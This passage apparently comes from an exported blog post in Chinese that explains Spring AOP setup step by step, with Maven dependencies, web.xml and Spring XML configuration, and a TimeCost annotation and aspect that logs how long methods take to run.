title=\"一、创建maven工程\"></a>一、创建maven工程</h2><p>通过STS创建一个maven工程martinye-demo-spring-support。</p>\n<p>修改pom.xml文件，添加项目相关依赖如下：</p>\n<p><strong>servlet</strong></p>\n<ul>\n<li>javax.servlet-api</li>\n<li>jstl</li>\n<li>standard</li>\n<li>jsp-api</li>\n</ul>\n<p><strong>spring</strong></p>\n<ul>\n<li>spring-webmvc</li>\n<li>aspectjweaver</li>\n</ul>\n<p><strong>log</strong></p>\n<ul>\n<li>slf4j-api</li>\n<li>slf4j-log4j12</li>\n</ul>\n<p><strong>utils</strong></p>\n<ul>\n<li>commons-lang3</li>\n<li>commons-collections</li>\n<li>commons-io</li>\n<li>guava</li>\n<li>fastjson</li>\n</ul>\n<p><strong>test</strong></p>\n<ul>\n<li>junit</li>\n<li>spring-test</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"二、配置servlet容器\"><a href=\"#二、配置servlet容器\" class=\"headerlink\" title=\"二、配置servlet容器\"></a>二、配置servlet容器</h2><p>配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml</p>\n<p>web servlet容器web.xml，添加加载spring容器的配置。<br>根据关注点不同，我们把spring容器配置定义分开，如下所示：</p>\n<h3 id=\"定义spring-root容器\"><a href=\"#定义spring-root容器\" class=\"headerlink\" title=\"定义spring root容器\"></a>定义spring root容器</h3><p>实例化类对象。</p>\n<p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-beans.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=\"tag\">&lt;/<span class=\"name\">listener-class</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">listener</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"定义spring-mvc容器\"><a href=\"#定义spring-mvc容器\" class=\"headerlink\" title=\"定义spring mvc容器\"></a>定义spring mvc容器</h3><p>处理用户请求。<br>spring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。</p>\n<p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- Processes application requests --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"三、配置spring-beans-xml\"><a href=\"#三、配置spring-beans-xml\" class=\"headerlink\" title=\"三、配置spring-beans.xml\"></a>三、配置spring-beans.xml</h2><p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:property-placeholder</span> <span class=\"attr\">ignore-resource-not-found</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">location</span>=<span class=\"string\">\"classpath*:app.properties\"</span> /&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>=<span class=\"string\">\"true\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.aspectj.lang.annotation.Aspect\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">aop:aspectj-autoproxy</span> <span class=\"attr\">expose-proxy</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">proxy-target-class</span>=<span class=\"string\">\"false\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>配置描述</strong>：</p>\n<ol>\n<li><p>加载配置资源：app.properties。</p>\n</li>\n<li><p>启用注解功能<br>除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。</p>\n</li>\n<li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p>\n</li>\n</ol>\n<h2 id=\"四、配置spring-mvc-xml\"><a href=\"#四、配置spring-mvc-xml\" class=\"headerlink\" title=\"四、配置spring-mvc.xml\"></a>四、配置spring-mvc.xml</h2><p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:property-placeholder</span> <span class=\"attr\">ignore-resource-not-found</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">location</span>=<span class=\"string\">\"classpath*:app.properties\"</span> /&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>=<span class=\"string\">\"false\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.aspectj.lang.annotation.Aspect\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.servlet.view.InternalResourceViewResolver\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"prefix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/views/\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"suffix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\".jsp\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">aop:aspectj-autoproxy</span> <span class=\"attr\">expose-proxy</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">proxy-target-class</span>=<span class=\"string\">\"false\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>配置描述</strong>：</p>\n<ol>\n<li><p>加载配置资源：app.properties。</p>\n</li>\n<li><p>启用注解功能<br>禁用默认的包扫描过滤策略，只扫描Controller注解。</p>\n</li>\n<li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p>\n</li>\n</ol>\n<h2 id=\"五、创建TimeCost注解\"><a href=\"#五、创建TimeCost注解\" class=\"headerlink\" title=\"五、创建TimeCost注解\"></a>五、创建TimeCost注解</h2><p>通过注解来开关是否需要进行方法耗时统计。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> com.martinye.demo.support.annotation;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.RetentionPolicy;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * <span class=\"doctag\">@description</span></div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-05-07 13:45:29</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"meta\">@Target</span>(&#123;ElementType.METHOD&#125;)</div><div class=\"line\"><span class=\"meta\">@Retention</span>(RetentionPolicy.RUNTIME)</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> TimeCost &#123;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"六、创建TimeCost切面\"><a href=\"#六、创建TimeCost切面\" class=\"headerlink\" title=\"六、创建TimeCost切面\"></a>六、创建TimeCost切面</h2><p>切面检测加有TimeCost的方法。</p>\n<p>为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。<br>此优先级通过在切面类上添加<code>@Order</code>注解来完成。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> com.martinye.demo.support.aspect;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.lang3.time.StopWatch;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.JoinPoint;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.ProceedingJoinPoint;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.Signature;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.After;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.AfterReturning;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.AfterThrowing;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Around;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Aspect;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Pointcut;</div><div class=\"line\"><span class=\"keyword\">import</span> org.slf4j.Logger;</div><div class=\"line\"><span class=\"keyword\">import</span> org.slf4j.LoggerFactory;</div><div class=\"line\"><span class=\"keyword\">import</span> org.springframework.core.annotation.Order;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * <span class=\"doctag\">@description</span> 方法耗时切面</div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-06-11 11:18:06</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"meta\">@Aspect</span></div><div class=\"line\"><span class=\"meta\">@Order</span>(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TimeCostAspect</span> </span>&#123;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">private</span> Logger logger = LoggerFactory.getLogger(<span class=\"keyword\">this</span>.getClass());</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Pointcut</span>(<span class=\"string\">\"@annotation(com.martinye.demo.support.annotation.TimeCost)\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">point</span><span class=\"params\">()</span> </span>&#123;&#125;;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Before</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">beforeAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= before advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@After</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= before around advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    </div><div class=\"line\">    StopWatch clock = <span class=\"keyword\">new</span> StopWatch();</div><div class=\"line\">    clock.start(); <span class=\"comment\">// 计时开始</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">try</span> &#123;</div><div class=\"line\">      joinPoint.proceed();</div><div class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</div><div class=\"line\">      <span class=\"keyword\">throw</span> e;</div><div class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</div><div class=\"line\">      clock.stop(); <span class=\"comment\">// 计时结束</span></div><div class=\"line\">      <span class=\"keyword\">long</span> timeCost = clock.getTime();</div><div class=\"line\">      Signature sig = joinPoint.getSignature();</div><div class=\"line\">      logger.info(<span class=\"string\">\"execute method &#123;&#125;.&#123;&#125; take time: &#123;&#125;(ms)\"</span>, sig.getDeclaringTypeName(),</div><div class=\"line\">          sig.getName(), timeCost);</div><div class=\"line\">      </div><div class=\"line\">      logger.info(<span class=\"string\">\"======= after around advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@AfterThrowing</span>(value = <span class=\"string\">\"point()\"</span>, throwing = <span class=\"string\">\"e\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterThrowingAdvice</span><span class=\"params\">(JoinPoint joinPoint, Throwable e)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after throwing advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    logger.info(<span class=\"string\">\" &gt; error info：\"</span> + e.getMessage());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@AfterReturning</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afteReturningAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after returning advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<p>此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。</p>\n<h2 id=\"一、创建maven工程\"><a href=\"#一、创建maven工程\" class=\"headerlink\" title=\"一、创建maven工程\"></a>一、创建maven工程</h2><p>通过STS创建一个maven工程martinye-demo-spring-support。</p>\n<p>修改pom.xml文件，添加项目相关依赖如下：</p>\n<p><strong>servlet</strong></p>\n<ul>\n<li>javax.servlet-api</li>\n<li>jstl</li>\n<li>standard</li>\n<li>jsp-api</li>\n</ul>\n<p><strong>spring</strong></p>\n<ul>\n<li>spring-webmvc</li>\n<li>aspectjweaver</li>\n</ul>\n<p><strong>log</strong></p>\n<ul>\n<li>slf4j-api</li>\n<li>slf4j-log4j12</li>\n</ul>\n<p><strong>utils</strong></p>\n<ul>\n<li>commons-lang3</li>\n<li>commons-collections</li>\n<li>commons-io</li>\n<li>guava</li>\n<li>fastjson</li>\n</ul>\n<p><strong>test</strong></p>\n<ul>\n<li>junit</li>\n<li>spring-test</li>\n</ul>","more":"<h2 id=\"二、配置servlet容器\"><a href=\"#二、配置servlet容器\" class=\"headerlink\" title=\"二、配置servlet容器\"></a>二、配置servlet容器</h2><p>配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml</p>\n<p>web servlet容器web.xml，添加加载spring容器的配置。<br>根据关注点不同，我们把spring容器配置定义分开，如下所示：</p>\n<h3 id=\"定义spring-root容器\"><a href=\"#定义spring-root容器\" class=\"headerlink\" title=\"定义spring root容器\"></a>定义spring root容器</h3><p>实例化类对象。</p>\n<p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-beans.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=\"tag\">&lt;/<span class=\"name\">listener-class</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">listener</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"定义spring-mvc容器\"><a href=\"#定义spring-mvc容器\" class=\"headerlink\" title=\"定义spring mvc容器\"></a>定义spring mvc容器</h3><p>处理用户请求。<br>spring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。</p>\n<p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- Processes application requests --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"三、配置spring-beans-xml\"><a href=\"#三、配置spring-beans-xml\" class=\"headerlink\" title=\"三、配置spring-beans.xml\"></a>三、配置spring-beans.xml</h2><p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:property-placeholder</span> <span 